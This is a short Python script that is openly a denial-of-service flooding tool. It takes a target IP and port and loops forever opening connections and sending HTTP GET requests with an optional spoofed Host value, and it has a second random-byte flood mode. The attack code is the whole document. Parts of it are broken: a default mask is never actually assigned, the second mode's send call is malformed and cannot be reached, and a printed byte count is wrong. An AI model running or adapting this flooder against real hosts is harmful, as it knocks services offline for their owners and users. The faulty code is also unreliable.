#Import Modules
import getopt, sys, os, time, argparse, socket, threading, string, random

#Get full command arguments
full_cmd_arguments = sys.argv

#Parse Only The Argument After The First
argument_list = full_cmd_arguments[1:]

#Add Variables
parser = argparse.ArgumentParser() 

parser.add_argument("--ipv4", "-ip", help="Set Target IP ")

parser.add_argument("--port", "-p", help="Set Target Port ")

parser.add_argument("--mask", "-mip", help="Set Mask IP ")

parser.add_argument("--http", "-htp", help="Set Attack Method to HTTP")

args = parser.parse_args()

rndbytes = os.urandom(1024)

mask = socket.gethostbyname(socket.gethostname())

letters = string.ascii_letters

Attack = 1

txtsent = ''.join(random.choice(letters) for i in range(10))

#add if args are used
if args.ipv4:
    print("Set target ip to %s" % args.ipv4)
else:
    print("error: USER INPUT = NULL")
    time.sleep(5)
    print("exiting, Error ID [301]")
    time.sleep(2)
    exit()

if args.port:
    print("Set target port to %s" % args.port)
else:
    args.port = 80

if args.mask:
    print("Set mask to %s" % args.mask)
    mask = args.mask
else:
    mask: "192.168.1.89"
    
if args.http:
    print("Set attack to http")
    Attack = 1

#attack code
while Attack == 1:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((args.ipv4, (int)(args.port)))
    print('sending ' "GET /" + args.ipv4 + " HTTP/1.1\r\n")
    s.sendto(("GET /" + args.ipv4 + " HTTP/1.1\r\n").encode('ascii'), (args.ipv4, args.port))
    print('sending ' "Host: " + mask + "\r\n\r\n")
    s.sendto(("Host: " +  mask + "\r\n\r\n").encode('ascii'), (args.ipv4, args.port))
    s.close()

while Attack == 2:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((args.ipv4, (int)(args.port)))
    print('sending 19132 bytes to ' + args.ipv4)
    s.sendto(rndbytes,(args.ipv4, (int)(args.port)))
    s.sendto(rndbytes,(args.mask)(args.port))
    txtsent = ''.join(random.choice(letters) for i in range(10))
    s.close()
